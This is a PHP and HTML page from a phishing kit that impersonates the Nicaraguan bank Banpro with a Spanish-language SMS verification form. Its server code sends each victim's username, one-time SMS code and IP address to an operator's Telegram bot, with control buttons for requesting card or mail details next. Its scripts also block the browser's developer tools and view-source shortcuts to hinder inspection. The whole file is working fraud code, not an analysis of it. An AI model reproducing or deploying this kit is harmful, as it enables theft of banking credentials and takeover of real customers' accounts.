<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { header('Location: /', true, 302); exit; }
include("oslo.php"); // Contiene $ambar y $koala

$u = $_SESSION['usuario'] ?? null;

if (isset($_GET['resend']) && $u) {
    $ip = ip_yago();
    $msg = "🔁 REENVÍO DE CÓDIGO SOLICITADO\n👤 Usuario: $u\n🌐 IP: $ip";
    file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text'    => $msg
    ]));
    echo 'ok';
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && $u) {
    $cd = $_POST['udata'] ?? '';
    $ip = ip_yago();

    $msg = "📲 VALIDACIÓN SMS BANPRO\n👤 Usuario: $u\n🔢 Código: $cd\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text' => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '❌ SMS Error', 'callback_data' => "SMSERROR|$u"],
                    ['text' => '🔁 Login', 'callback_data' => "LOGIN|$u"]
                ],
                [
                    ['text' => '💳 Card', 'callback_data' => "CARD|$u"],
                    ['text' => '📩 Mail', 'callback_data' => "MAIL|$u"],
                    ['text' => '✅ Listo', 'callback_data' => "LISTO|$u"]
                ]
            ]
        ])
    ]));

    header("Location: pampa.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validaci&#243;n</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <style>
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Regular.ttf') format('truetype');font-weight:400;font-style:normal;}
        @font-face{font-family:'NunitoSans';src:url('font/NunitoSans-Bold.ttf') format('truetype');font-weight:700 800;font-style:normal;}
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
        html{-webkit-text-size-adjust:100%;text-size-adjust:100%;touch-action:manipulation;}
        body{min-height:100vh;background:linear-gradient(to bottom,#69BE28,#006838);display:flex;flex-direction:column;align-items:center;font-family:'NunitoSans',sans-serif;padding-top:24px;}
        .wr{background:#fff;border-radius:12px 12px 0 0;padding:24px 20px 0;width:100%;max-width:420px;flex:1;display:flex;flex-direction:column;}
        .lg{margin-bottom:22px;text-align:left;}
        .lg img{height:52px;width:auto;}
        .wc h2{font-size:17px;font-weight:700;color:#222;margin-bottom:2px;font-family:'NunitoSans',sans-serif;}
        .wc p{font-size:14px;color:#444;margin-bottom:18px;font-family:'NunitoSans',sans-serif;font-weight:400;line-height:1.4;}
        .fb{margin-bottom:10px;}
        .fb label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-family:'NunitoSans',sans-serif;}
        .fb input{width:100%;padding:11px 13px;border:1px solid #ccc;border-radius:4px;font-size:15px;color:#333;outline:none;transition:border-color 0.2s;background:#fff;font-family:'NunitoSans',sans-serif;}
        .fb input:focus{border-color:#006838;}
        .rs{text-align:center;font-size:13px;color:#888;font-family:'NunitoSans',sans-serif;margin:14px 0 18px;}
        .rs .lnk{color:#006838;cursor:pointer;text-decoration:underline;}
        .bs{width:100%;padding:13px;background:#006838;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:18px;transition:background 0.2s;font-family:'NunitoSans',sans-serif;}
        .bs:hover{background:#005228;}
        .bs:disabled{opacity:0.6;cursor:not-allowed;}
        .bf{margin-top:auto;}
        .bl{display:flex;justify-content:space-between;padding:14px 0 20px;}
        .bl a{font-size:13px;color:#006838;text-decoration:underline;cursor:pointer;font-family:'NunitoSans',sans-serif;}
    </style>
</head>
<body>
<div class="wr">
    <div class="lg"><img src="l.png" alt="Banpro"></div>
    <div class="wc">
        <h2>Validaci&#243;n de Acceso</h2>
        <p>Ingrese por favor el c&#243;digo que le enviaremos a su n&#250;mero telef&#243;nico.</p>
    </div>
    <form method="post" action="" id="f1">
        <div class="fb">
            <label for="i1">Ingrese el C&#243;digo SMS</label>
            <input id="i1" name="udata" placeholder="C&#243;digo" type="text" inputmode="numeric" minlength="8" maxlength="8" required autocomplete="off" class="qi">
        </div>
        <p class="rs" id="resend-wrap">Reenviar c&#243;digo <span id="countdown">1:00</span></p>
        <button type="submit" class="bs">Continuar</button>
    </form>
    <div class="bf">
        <div class="bl">
            <a href="#">Tipo de Cambio</a>
            <a href="#">Afiliese</a>
        </div>
    </div>
</div>

<div id="sms-popup" style="position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);z-index:9999;display:flex;align-items:center;justify-content:center;transition:opacity 0.4s ease;padding:20px;">
    <div style="background:#fff;border-radius:0;padding:28px 24px;max-width:320px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.3);font-family:'NunitoSans',sans-serif;">
        <p style="font-size:14px;color:#333;line-height:1.6;font-weight:400;">Te hemos enviado un c&#243;digo, conf&#237;rmalo para continuar</p>
    </div>
</div>

<script>
    document.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
    document.addEventListener('keydown',function(e){
        if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74))||(e.ctrlKey&&e.keyCode===85)){e.preventDefault();return false;}
    });
    document.addEventListener('dragstart',function(e){if(e.target.tagName==='IMG'){e.preventDefault();return false;}});
    document.addEventListener('gesturestart',function(e){e.preventDefault();});
    document.addEventListener('dblclick',function(e){e.preventDefault();},{passive:false});

    document.getElementById('f1').addEventListener('submit',function(){
        var btn=this.querySelector('button[type="submit"]');
        if(btn){btn.disabled=true;btn.textContent='Enviando...';}
    });

    (function(){
        var p=document.getElementById('sms-popup');
        setTimeout(function(){p.style.opacity='0';setTimeout(function(){p.style.display='none';},400);},3000);
    })();

    (function(){
        var total=60;
        var cd=document.getElementById('countdown');
        var wr=document.getElementById('resend-wrap');
        var sent=false;
        var timer=setInterval(function(){
            total--;
            if(total<=0){
                clearInterval(timer);
                wr.innerHTML='<span id="resend-link" class="lnk">Reenviar c&#243;digo</span>';
                document.getElementById('resend-link').addEventListener('click',function(){
                    if(sent)return;
                    sent=true;
                    this.style.color='#aaa';this.style.textDecoration='none';this.style.cursor='default';
                    this.textContent='C&#243;digo reenviado';
                    fetch('mica.php?resend=1').catch(function(){});
                });
            }else{
                var m=Math.floor(total/60),s=total%60;
                cd.textContent=m+':'+(s<10?'0':'')+s;
            }
        },1000);
    })();
</script>
</body>
</html>